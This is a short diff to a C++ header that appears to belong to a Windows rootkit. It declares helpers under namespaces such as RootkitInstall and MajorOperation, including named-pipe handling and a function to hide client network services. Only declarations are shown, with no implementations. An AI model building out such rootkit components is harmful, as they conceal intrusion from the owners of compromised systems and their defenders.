@@ -108,6 +108,9 @@ namespace GeneralHelpers {
     int GetPidByName(const char* Name);
     int CheckLetterInArr(char Chr, const char* Arr);
     BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount);
+    BOOL DoesPathEndWithFile(char* DirPath);
+    HANDLE StartThread(PVOID ThreadAddress, PVOID ThreadParameters);
+    ULONG CalculateAddressValue(char* IpAddress);
 }
 
 namespace RootkitInstall {
@@ -115,10 +118,19 @@ namespace RootkitInstall {
     BOOL WINAPI CtrlHandler(DWORD ControlType);
     RETURN_LAST RealTime(BOOL IsDisable);
 }
+
 namespace RequestHelpers {
     BOOL ValidateInfoTypeString(const char* InfoType);
     void LogMessage(const char* Message, LogFile* MediumLog, BOOL IsError, int ErrorCode);
     BOOL ShouldQuit();
     int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* FileDataSize, BOOL IsWrite);
     ROOTKIT_UNEXERR ResolvePID(char* ModuleName, ULONG64* ProcessId);
+}
+
+namespace MajorOperation {
+    int TerminateMedium(NETWORK_INFO* SndInfo, HANDLE* PipeHandle, BOOL* IsValidPipe, int ReturnStatus);
+    DWORD ConnectToNamedPipe(HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPipe);
+    void ClientServiceThread(PVOID ServiceParameters);
+    BOOL InitializeClientServices();
+    BOOL HideClientServices(HANDLE* PipeHandle, LogFile* MediumLog, ULONG AddressInfo);
 }
